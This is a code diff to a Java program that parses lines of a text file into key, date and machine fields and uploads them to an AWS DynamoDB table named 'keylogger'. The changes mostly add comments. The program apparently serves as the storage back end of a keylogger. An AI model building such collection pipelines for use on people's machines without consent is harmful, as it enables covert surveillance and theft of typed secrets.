@@ -6,6 +6,7 @@ import java.util.Map;
 import java.util.Scanner;
 import java.util.UUID;
 
+// AWS import libraries
 import com.amazonaws.AmazonClientException;
 import com.amazonaws.AmazonServiceException;
 import com.amazonaws.auth.profile.ProfileCredentialsProvider;
@@ -24,14 +25,12 @@ import com.amazonaws.services.dynamodbv2.model.ScalarAttributeType;
 import com.amazonaws.services.dynamodbv2.model.TableDescription;
 import com.amazonaws.services.dynamodbv2.util.TableUtils;
 
-/**
- * Hello world!
- *
- */
+
 public class test {
     static AmazonDynamoDB dynamoDB;
-    private static void init() throws Exception {
 
+    private static void init() throws Exception {
+        // Returns error if not credentials found (credentials are in .aws folder)
         ProfileCredentialsProvider credentialsProvider = new ProfileCredentialsProvider();
         try {
             credentialsProvider.getCredentials();
@@ -57,7 +56,7 @@ public class test {
             init();
             String tableName = "keylogger";
 
-            // Create a table with a primary hash key named 'name', which holds a string
+            // Create a table with a primary hash key named 'ID', which holds a string
             CreateTableRequest createTableRequest = new CreateTableRequest().withTableName(tableName)
                     .withKeySchema(new KeySchemaElement().withAttributeName("ID").withKeyType(KeyType.HASH))
                     .withAttributeDefinitions(new AttributeDefinition().withAttributeName("ID").withAttributeType(ScalarAttributeType.S))
@@ -84,6 +83,7 @@ public class test {
             String line = "";
             String uuid="";
 
+            // Breaks every line of .txt into words and store each word in a variable
             while (sc.hasNextLine()) {
                 line = sc.nextLine();
                 String[] arrSplit = line.split(" ");
@@ -98,12 +98,13 @@ public class test {
                         uuid = String.valueOf(UUID.randomUUID());
                     }
                 }
+                // With variables update de Dynamo database
                 Map<String, AttributeValue> item = newItem(uuid,Integer.parseInt(k),Integer.parseInt(d),m);
                 PutItemRequest putItemRequest = new PutItemRequest(tableName, item);
                 PutItemResult putItemResult = dynamoDB.putItem(putItemRequest);
             }
 
-
+            // if problem with varibles type or any other problem uploading data return this string
         } catch (AmazonServiceException ase) {
             System.out.println("Caught an AmazonServiceException, which means your request made it "
                     + "to AWS, but was rejected with an error response for some reason.");
@@ -121,7 +122,7 @@ public class test {
 
         }
     }
-
+    // Variables map, defines each type for each variable
     private static Map<String, AttributeValue> newItem(String ID, int key, int date, String machine) {
         Map<String, AttributeValue> item = new HashMap<String, AttributeValue>();
         item.put("ID", new AttributeValue(ID));
